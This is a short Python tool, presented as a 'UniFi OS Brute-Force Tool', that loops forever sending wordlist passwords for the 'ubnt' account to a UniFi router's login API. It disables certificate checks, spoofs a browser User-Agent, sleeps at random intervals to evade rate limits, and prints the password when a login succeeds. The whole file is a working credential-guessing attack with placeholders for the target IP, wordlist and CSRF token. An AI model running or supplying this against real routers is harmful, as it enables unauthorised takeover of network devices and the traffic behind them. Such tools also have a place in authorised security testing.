import requests
import pdb
import time
import random
import json
import sys

import urllib3
urllib3.disable_warnings()

WORDLIST_F = "<WORDLIST>"
ROUTER_IP = "<ROUTER_IP>"

print(f"""

 __   __   ______     ______     __     ______   ______     ______     ______    
/\ \ / /  /\  ___\   /\  == \   /\ \   /\__  _\ /\  __ \   /\  ___\   /\  __ \   
\ \ \'/   \ \  __\   \ \  __<   \ \ \  \/_/\ \/ \ \  __ \  \ \ \____  \ \ \/\ \  
 \ \__|    \ \_____\  \ \_\ \_\  \ \_\    \ \_\  \ \_\ \_\  \ \_____\  \ \_____\ 
  \/_/      \/_____/   \/_/ /_/   \/_/     \/_/   \/_/\/_/   \/_____/   \/_____/ 

				UniFi OS Brute-Force Tool 0.1
					By Jeff J. Bowie
					veritaco.com
                                                                                 
""")

headers = {
	'Content-Type' : 'application/json',
	'Referer' : 'https://<ROUTER_IP>/login?redirect=%2F',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.2592.102',
	'X-CSRF-Token' : '<CSRF_TOKEN>',
}

data = {

	'username': 'ubnt',
	'password' : 'ubnt',
	'token' : '',
	'rememberMe' : False
}

password_list = open(WORDLIST_F, 'r')
password_lines = password_list.readlines()

# Infinite loop , TODO: Run length of password list , or until a successful authorizaiton.
while True:

	# Choose a random password from our list, and update our `data` dict.
	data.update({'password' : random.choice(password_lines)})

	# Create the request, igoring X509 Certificate errors.
	_r = requests.post(f"https://{ROUTER_IP}/api/auth/login", data=json.dumps(data), headers=headers, verify=False)
	
	# Forbidden, Print Status, Random Sleep Interval
	if _r.status_code == 403:
		print(f"[Username] ubnt")
		print(f"[Password] {data['password']}\n")
		print(f"[Body] {_r.text}")
		sleep_amt = random.uniform(1.231, 2.312)
		print(f"\t\t[Sleep] {sleep_amt}\n")
		time.sleep(sleep_amt)
		continue

	# On success, print password and exit script.
	elif _r.status_code == 200:
		print(f"[!] {data['password']}")
		sys.exit(0)
